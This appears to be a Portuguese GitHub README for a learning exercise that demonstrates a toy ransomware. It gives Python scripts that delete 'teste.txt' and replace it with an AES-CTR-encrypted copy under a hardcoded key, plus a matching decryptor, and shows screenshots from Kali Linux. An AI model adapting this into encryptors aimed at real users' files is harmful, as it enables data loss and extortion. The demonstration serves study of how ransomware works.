# cibersecurity-ransomware-criptografia

criei o codigo para criptografar a mensagem

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

criei o codigo para descriptografar a mensagem

import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()

processo feito no kali-linux

![processo](https://github.com/user-attachments/assets/b88a15f4-c705-41e7-b265-48b23f94245f)

arquivo criptografado

![arquivo criptografado](https://github.com/user-attachments/assets/ef627a09-30a8-471d-af3e-9feec311d393)

arquivo descriptografado

![arquivo descriptografado](https://github.com/user-attachments/assets/4958dd84-a023-4615-add9-6f217733c691)
